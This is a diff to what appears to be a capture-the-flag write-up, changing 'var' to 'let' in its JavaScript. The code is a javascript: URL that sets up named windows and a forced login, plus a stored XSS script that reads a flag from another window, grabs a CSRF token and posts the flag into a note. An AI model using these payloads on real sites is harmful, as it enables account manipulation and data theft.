@@ -111,15 +111,15 @@ The final part of our report payload is to add an HTML form to the body element 
 ```javascript
 javascript:window.open('http://0.0.0.0:8080/notes','winA');
 let w=window.open('about:blank','winB');
-var f=document.createElement('form');
+let f=document.createElement('form');
 f.action='http://0.0.0.0:8080/login';
 f.method='POST';
 f.target='_blank';
-var u=document.createElement('input');
+let u=document.createElement('input');
 u.type='text';
 u.name='username';
 u.value='rewks';
-var p=document.createElement('input');
+let p=document.createElement('input');
 p.type='password';
 p.name='password';
 p.value='1';
@@ -136,24 +136,24 @@ Before submitting the above, we need to store a XSS payload that will take care 
 ```javascript
 <script>
 let fw=window.open('', 'winA');
-var flag=fw.document.getElementsByTagName('p')[0].textContent;
-var csrftoken;
+let flag=fw.document.getElementsByTagName('p')[0].textContent;
+let csrftoken;
 fetch('http://0.0.0.0:8080/new')
     .then(async res => await res.text())
     .then(data => csrftoken = data.split('value="')[1].split('">')[0])
     .then(() => {
-        var f=document.createElement('form');
+        let f=document.createElement('form');
         f.action='http://0.0.0.0:8080/new';
         f.method='POST';
-        var c=document.createElement('input');
+        let c=document.createElement('input');
         c.type='hidden';
         c.name='_csrf';
         c.value=csrftoken;
-        var t=document.createElement('input');
+        let t=document.createElement('input');
         t.type='text';
         t.name='title';
         t.value='FLAG';
-        var n=document.createElement('input');
+        let n=document.createElement('input');
         n.type='textarea';
         n.name='content';
         n.value=flag;
